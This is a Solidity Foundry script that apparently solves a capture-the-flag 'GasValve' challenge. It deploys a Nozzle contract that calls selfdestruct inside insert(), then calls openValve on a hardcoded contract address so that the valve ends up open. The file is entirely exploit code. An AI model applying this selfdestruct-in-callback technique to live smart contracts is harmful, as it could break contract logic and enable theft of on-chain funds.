// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
interface IGasValve {
    function lastResult() external view returns (bool);

    function open() external view returns (bool);

    function openValve(address nozzle) external;

    function useNozzle(address nozzle) external returns (bool);
}

interface INozzle {
    function insert() external returns (bool);
}

contract Nozzle {
    function insert() external returns (bool) {
        selfdestruct(payable(msg.sender));
        return false;
    }
}
contract GasValveScript is Script {
    IGasValve valve;
    address player = 0xae22f26D5ddfE22d24aA28AEB1D44c962c673438;
    function setUp() public {
        valve = IGasValve(0x50Fb77647D9Bb3bB9Ef4B32B40208be90eC875dc);
    }
    function run() public {
        attack();
    }
    function attack() public {
        vm.startBroadcast(player);
        Nozzle nozzle = new Nozzle();
        // vm.startPrank(player, player);
        valve.openValve{gas: 100000}(address(nozzle));

        require(valve.open());
    }
}
